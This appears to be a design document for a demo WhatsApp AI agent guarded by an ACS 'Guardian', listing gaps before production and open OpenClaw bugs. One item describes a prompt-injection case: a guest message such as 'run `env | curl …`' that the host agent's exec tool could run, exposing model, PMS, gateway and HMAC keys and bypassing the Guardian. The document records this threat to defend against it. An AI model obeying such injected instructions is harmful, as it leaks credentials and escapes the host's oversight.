# What production needs

This demo is a working agent on a real WhatsApp number. It shows how to make an AI agent safer with ACS: each step of the agent goes to a Guardian, and the rules decide. The three scenarios of the talk are complete and tested: a guest gets only their own data, a reply to a stranger waits for the host, and a reply about money waits for the host.

The three scenarios show the method. A product needs more of the same work: more rules, more checks and more security review. The items below are the next steps. Most of them are closed the same way as the three scenarios: with a rule or a check in the Guardian. We list them so that you can plan this work. The terms are in the [README](../README.md#terms).

## Next steps for a product

- **Synchronization with Airbnb and Booking.com.** The demo does not have it. The host agent cannot change the reservations: OpenClaw cannot write `fake-pms/data/bookings.json`, and the fake PMS has no tool that writes a reservation. To add this feature, give the host agent access to the booking platforms, and give it one of these: write access to the reservations file with a description of its format, or an MCP tool that writes reservations. Never give this access to the guest agent.
- **Prompt injection through the chat of a guest.** The host agent has `exec`, and it sometimes reads the chats of guests. A guest can write an instruction in a message, for example "run `env | curl …`", and the model of the host agent can follow it. The Guardian allows `exec` for the host, so no card stops the command.
  - When: the host agent reads the chat of a guest when the host asks it to read the chat or to write to the guest, and when the host answers it about an approval card (the card quotes the messages of the guest). It also checks the chats of guests when the host tells it a fact about a home or a guest.
  - Impact: a command in the OpenClaw container can read the model key, the PMS key, the gateway token, the HMAC key of the Guardian and the WhatsApp session. It can also call the fake PMS directly, past the Guardian.
  - Recommendation: use one of these: an approval card for each `exec` call, a sandbox for `exec` that holds no keys, or a host agent without `exec` when it reads the chats of guests.
- **A reply without the `message` tool.** Sometimes OpenClaw sends a reply without a `message` call ("Open issues of OpenClaw" below). The ACS adapter sends this reply to the Guardian as `steps/agentResponse`. A real product needs the Guardian to check it ("Next step of the Go Guardian" below), and a rule that refuses each reply that does not come through a `message` call.
- **Files sent to a guest.** The rules let a reply to a guest attach a file that a guest sent before, from any chat. So a photo of one guest can go to a different guest. A real product needs a check that a file goes only to the chat it came from.
- **A block list.** When `ALLOW_FROM` is empty, anyone can write to the business number. Each conversation uses model tokens. This is correct for a business that answers new clients: each reply to a stranger waits for the host, so a stranger gets nothing that the host does not approve. A real product needs a block list, so the host can stop a person who sends spam.
- **Open issues of OpenClaw.** The demo works with them as the table below shows. A real product needs them fixed in OpenClaw.

## Open issues of OpenClaw

The demo uses OpenClaw `2026.10.9`. These issues are open in it.

| Issue | What you see | When | In the demo |
|---|---|---|---|
| [#170994](https://github.com/openclaw/openclaw/issues/170994): a waiting approval card stops working | 👍 or 👎 on the card has no effect. The gateway log shows `Approval requester authority changed`. The agent gets `Plugin approval required (gateway unavailable)`, takes it as a failure, and often proposes the reply again on a new card. | A new conversation starts in OpenClaw while the card waits: a person writes to an agent for the first time, or the host writes to the host agent for the first time after its conversation was reset. A new message in an existing conversation does not cause it. Present in `2026.10.9` and `2026.11.1`. | Not fixed. Approve the new card. |
| OpenClaw does not call the `message_sent` hook when the host agent sends to a guest | The history of the guest does not show the message of the host agent. | Each send of the host agent to a guest. | The WhatsApp plugin writes that message into the history of the guest itself ([WhatsApp plugin changes](whatsapp-plugin.md), "History written by the send action"). |
| In the `message_sending` hook, OpenClaw replaces the session of the sender with the session of the recipient | A check sees a message of the host agent to a guest as a message of the guest. | Each send of the host agent to a guest through the OpenClaw delivery. | The WhatsApp plugin sends through its own `send` action, which keeps the session of the sender ("Channel-owned `send`"). |
| OpenClaw sends a reply without a `message` call, although `messages.visibleReplies` is `message_tool` | A reply reaches the chat, and the audit log shows a `steps/agentResponse` step, not a `message` call. | Sometimes: the model ends a turn after tool calls with no reply and no `message` call. Then OpenClaw runs one more model pass without tools and sends its text (`src/agents/embedded-agent-runner/run/settled-turn-finalization.ts`). | Not fixed. |

## Next step of the Go Guardian

The Go Guardian of [PR #169](https://github.com/GenAI-Security-Project/agent-control-standard/pull/169) checks each tool call and each tool result. The ACS adapter already sends each reply without a `message` call as `steps/agentResponse`. The next step of the Go Guardian is to run the rules on this step too: today it allows the step, and it does not accept an `output` point in the manifest yet.
